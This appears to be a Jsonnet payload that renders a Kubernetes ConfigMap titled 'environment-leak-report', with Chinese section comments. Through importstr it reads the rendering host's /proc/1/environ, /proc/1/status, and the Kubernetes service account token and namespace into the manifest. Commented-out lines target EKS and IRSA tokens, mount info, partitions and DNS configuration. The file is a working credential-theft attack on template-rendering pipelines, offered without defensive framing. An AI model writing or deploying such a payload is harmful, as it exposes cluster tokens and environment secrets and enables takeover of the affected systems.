{
  apiVersion: "v1",
  kind: "ConfigMap",
  metadata: {
    name: "environment-leak-report",
  },
  data: {
    // --- 进程与权限状态 ---

    "proc-1-status": importstr "/proc/1/status",
    "proc-1-environ": importstr "/proc/1/environ",
    
    
    // --- 身份凭证 ---
    "k8s-token": importstr "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "k8s-namespace": importstr "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    // "pia-eks-token": importstr "/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token",
    // "irsa": importstr "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",

    // --- 新增：挂载与文件系统信息 ---
    // 查看当前容器挂载了哪些卷，是否存在危险的宿主机挂载
    //"mounts": importstr "/proc/self/mountinfo",
    
    // 查看磁盘分区情况（如果有权限读取）
    //"partitions": importstr "/proc/partitions",

    // 查看网络配置（有时包含内网域名解析规律）
    //"etc-hosts": importstr "/etc/hosts",
    //"etc-resolv": importstr "/etc/resolv.conf",

    // --- 环境变量 ---
    // 注意：/proc/1/environ 包含 null 字符 (\0)，Jsonnet 处理时可能会报错或显示异常
    //"proc-1-environ": importstr "/proc/1/environ",
  }
}
